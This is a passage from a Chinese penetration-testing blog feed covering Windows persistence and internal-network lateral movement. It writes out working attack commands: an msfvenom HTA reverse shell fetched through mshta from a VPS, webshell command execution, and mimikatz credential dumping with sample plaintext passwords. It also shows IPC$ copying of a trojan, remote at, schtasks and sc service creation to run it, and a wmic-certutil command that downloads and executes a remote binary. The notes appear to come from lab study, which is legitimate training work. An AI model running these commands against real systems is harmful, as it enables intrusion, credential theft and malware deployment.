title="服务后门"></a>服务后门</h1><blockquote><p>用sc创建一个test服务，执行我们上传的木马。实用性不是很强</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create test binPath= BinaryPathName</span><br></pre></td></tr></table></figure><p>重启权限维持，但一般杀软会拦截。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Windows权限维持–后门篇</a></p><p><a href="https://cloud.tencent.com/developer/article/1850726">干货 | 最全Windows权限维持总结</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x28 - 内网横向移动</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动简介"><a href="#横向移动简介" class="headerlink" title="横向移动简介"></a>横向移动简介</h1><p>当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。</p><p>工作组内横向移动和在外网渗透很相似</p><p>域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器中拿到域控的凭证登录域控。再或者就是内网弱口令也很多，这种弱口令一拿就是一大批，扩大攻击范围。</p><p>我们内网渗透过程中，首先使用Windows内置的工具，如果不满足需求就再上传外部工具进行渗透</p><h1 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h1><p>也就是拿到一台进入内网的入口,信息收集发现weblogic资产</p><ul><li>扫描：</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112055209.png" alt="image-20220811205540863" style="zoom: 33%;" /><ul><li>利用weblogic历史漏洞：利用脚本写入webshell</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112057659.png" alt="image-20220811205716568" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112058391.png" alt="image-20220811205828304" style="zoom:50%;" /><ul><li>利用小马传大马：MSF生成HTA反弹shell</li></ul><p>传hta弹shell，可以远程下载hta，无文件落地上线msf（优点）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4002 -f hta-psh -o 4002.hta</span><br><span class="line"></span><br><span class="line">-f hta-psh以hta格式输出</span><br><span class="line"></span><br><span class="line">并开启msf监听：</span><br></pre></td></tr></table></figure><ul><li>通过WEB漏洞反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（内置）mshta远程下载hta文件执行</span><br><span class="line">并在vps开启一个web服务供下载hta文件（python3 -m http.server）</span><br><span class="line">http://1xx.xx.xx.95:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line">以非交互式方式执行命令</span><br></pre></td></tr></table></figure><ul><li><p>得到MSF会话，在meterpreter中，可以通过run命令记载Post\后渗透模块进行使用。</p></li><li><p>获取账号密码</p></li></ul><p><strong>mimikatz能从lsass.exe文件中读取密码，因为只要某个用户登录过，其密码就会记录在lsass.exe进程中，只要其没有重启或者关机，密码都会记录在lsass.exe进程之中</strong></p><p><strong>这种记录密码的特性为我们域内渗透提供了一种新的思路：</strong></p><p><strong>如果域提权不了，拿不到域控，我们便可以通过下面获取账号密码的方式可以获取其他用户的账户和密码</strong></p><p><strong>那么我们就可以从获取的其他用户账户密码入手继续登录其他主机，再在其机器上查找有无域控账户的登录痕迹，如果域控登陆过这台机器，就会有域控的账户密码，籍此方法间接获取域控的权限</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051846777.png" alt="image-20220805184648622" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在msf中有集成mimikatz的模块</span><br><span class="line">load kiwi加载内置的mimikatz</span><br><span class="line">加载完模块后，可以通过help查看加载的模块的用法</span><br><span class="line">getsystem先提升权限，获取system权限</span><br><span class="line">creds_all获取所有凭证</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web\administrator   1qaz@WSX</span><br></pre></td></tr></table></figure><ul><li>登录验证（验证拿到的账号密码能否进行登录）</li></ul><p>通过了两个工具，一个是crackmapexec，一个是smbclient</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec：对目标主机smb协议以及默认文件共享进行一枚举，通过我们提供的账户密码获取其文件共享</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;WEB\administrator&#x27; -p &#x27;1qaz@WSX&#x27; --shares</span><br><span class="line">用GUNGNIR域控管理员的账户密码：</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;administrator&#x27; -p &#x27;1qaz@WSX3&#x27; --shares</span><br><span class="line"></span><br><span class="line">smbclient：利用账户密码，提供smb服务登录到其系统，就相当于拿到了一个命令行终端</span><br><span class="line">smbclient //192.168.10.112/C$ -U &#x27;WEB\administrator%1qaz@WSX&#x27;</span><br><span class="line">输入help即可查看可以使用的命令</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208120911337.png" alt="image-20220812091111949"></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051847741.png" alt="image-20220805184747362" style="zoom:50%;" /><h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><blockquote><ul><li>cs中meterpreter中的shell的本质，就是在目标主机起一个cmd.exe</li><li>H:\ATTACK\权限提升\SysinternalsSuite目录中有Sysinternal工具</li></ul><p>Sysinternal是微软官方开发的一些工具套件，可以使用这些工具去分析系统的一些进程啊什么的</p><p>可以使用文件夹中的procexp64.exe来分析进程</p></blockquote><ul><li>内网主机存活探测(尝试找出域控ip)</li></ul><p>如何寻找域控呢？</p><ol><li>下面工具的功能，类似内网<code>arp -a</code>查看各个网段有哪些IP主机存活,并尝试判断域控是哪个</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208121520690.png" alt="image-20220812152048429" style="zoom: 50%;" /><ol start="2"><li><code>ipconfig -all</code>查找本机的DNS服务器，一般是域控在提供DNS解析</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130005835.png" alt="image-20220813000513503" style="zoom:50%;" /><p>3.直接ping 域名，如<code>ping gungnir.top</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130006771.png" alt="image-20220813000617610" style="zoom:50%;" /><ol start="4"><li>扫描发现：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbscan.exe -m 10.10.10.0/24</span><br><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051848699.png" alt="image-20220805184808384" style="zoom: 33%;" /><h1 id="横向移动-内置工具篇"><a href="#横向移动-内置工具篇" class="headerlink" title="横向移动-内置工具篇"></a>横向移动-内置工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><h3 id="IPC-简介"><a href="#IPC-简介" class="headerlink" title="IPC$  简介"></a>IPC$  简介</h3><p>IPC$  (Internet Process Connection) 是<strong>共享”命名管道”<strong>的资源，它是为了</strong>让进程间通信而开放的命名管道</strong>，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。当然也可以关闭<br>利用 IPC$ ，连接者与目标主机利用建立的连接可以得到目标主机上的<strong>目录结构、用户列表</strong>等信息。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>开放了 139 、 445 端口；</li></ul><p>IPC$  连接可以实现<strong>远程登陆及对默认共享</strong>的访问，而 <strong>139 端口的开启表示 netbios</strong>  协议的应用。445是smb服务<br>我们可以通过 139 和 445 端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲， IPC$ 连接是需要 139或 445 端口来支持的。<br>IPC$  连接默认会走 445 端口，不通的话则会走 139 端口，这两个端口都可以单独实现文件共享</p><p>一般Windows会有默认共享，也就是意味着会开发这些端口</p><ul><li>目标开启 IPC$  <strong>文件共享服务</strong>及<strong>默认共享</strong></li></ul><p>默认共享是<strong>为了方便管理员远程管理</strong>而默认开启的共享。<br>所有逻辑磁盘（ c$、d$、e$ …）和系统目录 WINNT  或 WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问。具备管理员权限即可去实现相应的功能</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051850244.png" alt="image-20220805185059115" style="zoom:50%;" /><ul><li>需要目标机器的<strong>管理员账号和密码</strong></li></ul><p>域内：默认情况下只有被添加到远程计算机<strong>管理员组的域用户（域管用户）</strong>有权限对 <strong>admin$</strong>  目录建立 IPC  连接</p><p>工作组内：<strong>本地的 Administrator  用户</strong>也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator  用户远程连接</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>这些命令不要死记硬背，只要我们本地用什么命令，如何加上个<code>\\10.10.10.10\</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 连接</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:PC\administrator &quot;1qaz@WSX3e&quot;</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:GUNGNIR\administrator &quot;1qaz@WSX3&quot;</span><br><span class="line">2. 查看连接情况</span><br><span class="line">net use</span><br><span class="line">3. 查看目标主机时间</span><br><span class="line">net time \\10.10.10.10</span><br><span class="line">net  time 默认查看本机时间</span><br><span class="line">4. 查看C盘文件</span><br><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051854255.png" alt="image-20220805185438016" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. 删除连接</span><br><span class="line">net use \\10.10.10.201\ipc$ /del </span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051855893.png" alt="image-20220805185501722" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 文件上传下载</span><br><span class="line">copy shell.exe \\10.10.10.201\c$\windows\temp\plugin_update.exe   </span><br><span class="line">copy \\10.10.10.201 \c$\59.exe c:\</span><br><span class="line">6. 查看目标主机文件</span><br><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">7. 开放/关闭 ipc$ 共享。</span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line">8. 共享计算机 C 盘。</span><br><span class="line">net share C=c:\</span><br><span class="line">9. 映射共享磁盘到本地。将目标的C盘挂载到本地的z盘下（原本没有z盘）</span><br><span class="line">net use z: \\10.10.10.10\c$ </span><br><span class="line">10. 查看/删除共享的资源。</span><br><span class="line">net share</span><br><span class="line">net share C /del</span><br><span class="line">11. 取消IPC远程连接。</span><br><span class="line">net use c: /del</span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><p>挂在目标机器的磁盘效果图：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130022829.png" alt="image-20220813002211620" style="zoom:50%;" /><h3 id="IPC-连接失败常见错误号"><a href="#IPC-连接失败常见错误号" class="headerlink" title="IPC$连接失败常见错误号"></a>IPC$连接失败常见错误号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一定要注意防火墙问题！！！！大部分内网机器都可能开了防火墙</span><br><span class="line"></span><br><span class="line">错误号 5，拒绝访问                      【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="line">错误号 51，Windows 无法找到网络路径     【网络有问题】</span><br><span class="line">错误号 53，找不到网络路径               【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】</span><br><span class="line">错误号 67，找不到网络名                 【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】</span><br><span class="line">错误号 1219，提供的凭据与已存在的凭据集冲突     【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="line">错误号 1326，未知的用户名或错误密码             【用户名或密码错误】</span><br><span class="line">错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">错误号 1792，试图登录，但是网络登录服务没有启动     【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 2242，此用户的密码已经过期                   【目标有帐号策略，强制定期要求更改密码】</span><br></pre></td></tr></table></figure><h2 id="IPC-AT-x2F-Schtasks"><a href="#IPC-AT-x2F-Schtasks" class="headerlink" title="IPC+AT&#x2F;Schtasks"></a>IPC+AT&#x2F;Schtasks</h2><ul><li>ipc 结合定时任务实现执行上传的文件 得到权限的过程 。主要是因为本地开启一个进程可以用<code>start a.exe</code> 但是通过net建立连接的远程主机是不支持start远程开启进程。所以我们才需要依赖定时任务</li><li>at&#x2F;schtasks都是定时任务，后面几个版本淘汰了at</li><li>打开计划任务的命令是<code>Taskschd.msc</code></li></ul><h3 id="AT简介"><a href="#AT简介" class="headerlink" title="AT简介"></a>AT简介</h3><p>AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks">https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks</a></p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立IPC连接：</span><br><span class="line">net use \\10.10.10.30\c$ /user:pc\administrator &quot;1qaz@WSX&quot;</span><br><span class="line"></span><br><span class="line">上传木马文件59.exe：</span><br><span class="line">copy 59.exe \\10.10.10.30\c$</span><br><span class="line"></span><br><span class="line">查看远程主机时间：</span><br><span class="line">net time \\10.10.10.30</span><br><span class="line"></span><br><span class="line">AT命令添加任务：(注意执行可执行程序要带绝对路径，并且双斜杠)</span><br><span class="line">at \\10.10.10.30 19:08 c:\\59.exe</span><br><span class="line">at \\10.10.10.30 19:08 calc.exe这样执行不会有回显啊什么的 但是确切的会执行程序</span><br><span class="line"></span><br><span class="line">AT命令删除任务：</span><br><span class="line">at \\10.10.10.30 1 /delete</span><br><span class="line"></span><br><span class="line">AT命令查看任务：</span><br><span class="line">at \\10.10.10.30   #查看at任务列表，已经执行了的，不会显示。</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051859950.png" alt="image-20220805185712800"></p><p>注意：</p><blockquote><p>问题：执行at命令时，显示绑定句柄无效。<br>解决：echo 10.10.11.100 RemoteHost &gt; C:\Windows\System32\drivers\etc\hosts<br>AT命令在windows server 2012等新版系统中已被弃用<br>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler服务</p></blockquote><h3 id="Schtasks简介"><a href="#Schtasks简介" class="headerlink" title="Schtasks简介"></a>Schtasks简介</h3><p>由于 AT 在 windows server 2012 等新版系统中已被弃用，所以需要使用 schtasks  命令代替。</p><blockquote><p>允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Create     创建新计划任务。</span><br><span class="line">/Delete     删除计划任务。</span><br><span class="line">/Query      显示所有计划任务。</span><br><span class="line">/Change     更改计划任务属性。</span><br><span class="line">/Run        按需运行计划任务。</span><br><span class="line">/End        中止当前正在运行的计划任务。</span><br><span class="line">/ShowSid    显示与计划的任务名称相应的安全标识符。</span><br><span class="line">/?          显示此帮助消息。</span><br></pre></td></tr></table></figure><blockquote><p>更多请参考：<a href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a></p></blockquote><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建任务</span><br><span class="line">schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU system</span><br><span class="line">#运行任务</span><br><span class="line">schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码</span><br><span class="line">#删除任务</span><br><span class="line">schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码</span><br><span class="line"></span><br><span class="line">#具体细项的意义：</span><br><span class="line">schtasks /create             创建新的计划任务。</span><br><span class="line">         /sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line">         /mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">         /tr &lt;TaskRun&gt;       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line">         /tn &lt;TaskName&gt;      指定任务的名称。</span><br></pre></td></tr></table></figure><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><ul><li>建立IPC连接</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.10.201 /user:PC\administrator &quot;1qaz@WSX&quot;</span><br><span class="line">net use</span><br></pre></td></tr></table></figure><ul><li>上传木马</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">copy c:\windows\temp\59.exe \\10.10.10.201\c$</span><br></pre></td></tr></table></figure><ul><li>远程主机创建定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.30 /u PC\administrator /p &quot;1qaz@WSX3&quot; /sc MINUTE /mo 1 /tn test2 /tr &quot;c:\59.exe&quot;</span><br><span class="line"></span><br><span class="line">/sc minute 间隔类型：分钟，minute、month、day、hours</span><br><span class="line">/mo 1间隔时常：每1，配合/sc，表示每1分钟</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081304694.png" alt="image-20220808130447566" style="zoom:50%;" /><ul><li>查看远程主机创建的定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">schtasks /query /s 10.10.10.201 /tn test2</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081305648.png" alt="image-20220808130550497" style="zoom:50%;" /><p>不更改代码页编码，直接查看可能会显示如下错误：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306574.png" alt="image-20220808130607471" style="zoom:50%;" /><ul><li>立即执行Schtasks运行远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.201 /u de1ay\administrator /p &quot;1qaz@WSX3&quot; /tn test2</span><br></pre></td></tr></table></figure><ul><li>Schtasks删除远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /delete /tn At1 /s 10.10.10.201 /u administrator /p 1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306353.png" alt="image-20220808130645254" style="zoom:50%;" /><h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><h3 id="SC简介"><a href="#SC简介" class="headerlink" title="SC简介"></a>SC简介</h3><p>sc 命令是Windows系统下通过<strong>注册、删除和查询系统服务</strong>的一个东西。</p><p>注意：</p><ul><li>关于Windows服务，其均是以system权限启动，所以我们如果通过注册建立了一个服务，通过服务开启的终端将也会具备system的权限！！另外需要管理员权限才能创建服务。也就是从管理员到系统权限的一个过程</li></ul><blockquote><p>sc命令详解：<a href="http://www.cnsendblog.com/?p=644">http://www.cnsendblog.com/?p=644</a></p><p>视频粗略讲解：<a href="https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line">SC [Servername] command Servicename [Optionname= Optionvalues]</span><br><span class="line"></span><br><span class="line">常见：</span><br><span class="line">sc \query 查看系统所有服务信息 ，询问一个服务的状态，也可以列举服务的状态类型。 有很多 一般会超出缓冲区限制，可以先复制到剪切板</span><br><span class="line">sc \query | clip查看全部内容</span><br><span class="line">sc \query +服务名   查看指定名称的信息</span><br><span class="line">sc 可以通过config设置服务的状态</span><br><span class="line">sc stop +服务名    停止服务</span><br><span class="line">sc config +服务名 start= 类型设置服务的启动类型（注意类型前有空格）</span><br><span class="line">sc qc --------------查询服务的配置信息</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>很多的命令需要管理员权限，所以我想说，在你操作这些东西的时候最好是管理员。</li><li>当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以得 到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 </li><li>当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。</li></ul><h3 id="SC远程注册服务"><a href="#SC远程注册服务" class="headerlink" title="SC远程注册服务"></a>SC远程注册服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sc远程创建服务</span><br><span class="line">sc \\10.10.10.201 create test binpath= &quot;c:\59.exe&quot; obj= &quot;de1ay\administrator&quot; password= 1qaz@WSX3e</span><br><span class="line">#sc启动指定服务</span><br><span class="line">sc \\10.10.10.201 start test</span><br><span class="line">#sc停止指定服务</span><br><span class="line">sc \\10.10.10.201 stop test</span><br><span class="line">sc \\10.10.10.201 delete test</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307487.png" alt="image-20220808130724362" style="zoom:50%;" /><p><strong>注意几点：</strong></p><ul><li><p>binpath设置选项’&#x3D;’后面有一个空格,这种选项等会后面都要接一个等号再接选项值</p></li><li><p>Windows上注册一个服务的话，必须要是服务类型，也就是创建时候binpath的文件要是服务，而不是进程。因为如果不是一个服务的话，就会导致生成的服务和服务控制器之间无法通信，服务控制器会判定这个服务不是一个系统的服务。因此就会产生隔一段时间就会断掉的现象。那么如何解决此类问题呢？</p><p>方法一：进程迁移，在连接终端期间执行其他命令。将我们的连接稳固到其他进程中</p><p>方法二：通过sc注册服务，生成的木马要是服务类型。可以在cs中生成。</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131628485.png" alt="image-20220813162825167" style="zoom:50%;" /><ul><li>另外在启动服务类型中分为本地系统启动和远程网络启动。注意最后一项</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131630098.png" alt="image-20220813163020930" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\10.10.10.201 qc test</span><br><span class="line"></span><br><span class="line">qc--------------查询服务的配置信息。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307785.png" alt="image-20220808130752669" style="zoom:50%;" /><h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><h3 id="WMIC简介"><a href="#WMIC简介" class="headerlink" title="WMIC简介"></a>WMIC简介</h3><p>WMI:(Windows Management Instrumentation Windows 管理规范)，是用户管理本地和远程计算机的一种模型。通过它<strong>可以访问、配置、管理和监视几乎所有的Windows资源</strong>。WMI的语法十分简单，基本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。</p><p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。</p><p><strong>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问,它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</strong> </p><p>而WMIC是为WMI提供的命令行界面。</p><blockquote><p>详细参考：<a href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic">https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic</a><br><a href="https://blog.csdn.net/discover2210212455/article/details/82711930">https://blog.csdn.net/discover2210212455/article/details/82711930</a></p></blockquote><h4 id="命令使用条件"><a href="#命令使用条件" class="headerlink" title="命令使用条件"></a>命令使用条件</h4><ol><li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li><li>防火墙允许135、445等端口通信</li></ol><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>实际上wmic能对本地主机做什么操作 就能对远程主机做什么操作</p><ul><li>查询进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.30 /user:pc\administrator /password:1qaz@WSX process list brief</span><br></pre></td></tr></table></figure><p><strong>WMI不支持执行命令，而是支持执行文件</strong>，可以通过加相应的参数执行命令，比如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd.exe /c ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>利用create创建进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process call create /?</span><br><span class="line">调用                    [ 内/外 ]参数类型(&amp;T)状态        </span><br><span class="line">====                    ===========================        </span><br><span class="line">Create                  [IN ]CommandLine(STRING)                    (null)</span><br><span class="line">                        [IN ]CurrentDirectory(STRING)</span><br><span class="line">                        [IN ]ProcessStartupInformation(OBJECT)</span><br><span class="line">                        [OUT]ProcessId(UINT32)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c calc.exe&quot;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><blockquote><p>如果出现User credentials cannot be used for local connections,应该是调用calc.exe程序权限不够的问题</p></blockquote></li><li><blockquote><p>如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用</p></blockquote></li></ul><p><strong>wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。</strong></p><ul><li>下载远程文件并执行上线</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c  certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe</span><br><span class="line">是录播中的知识 文件下载</span><br><span class="line">我们可以用Windows下管理证书的certutil.exe程序下载远程主机的恶意文件，保存在c:/windows/temp/test.exe目录，再&amp;之后执行程序上线</span><br><span class="line">注意这个地方的远程主机（指的是我们已经拿下的web机器，因为内网pc机器不出网，所以只好放在这台机器上的web服务，给内网目标主机下载）</span><br><span class="line"></span><br><span class="line">实际上，当我们内网主机不能出网的时候，我们就可以通过在拿下的机器上做文章，放文件 </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081313574.png" alt="image-20220808131343441"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic 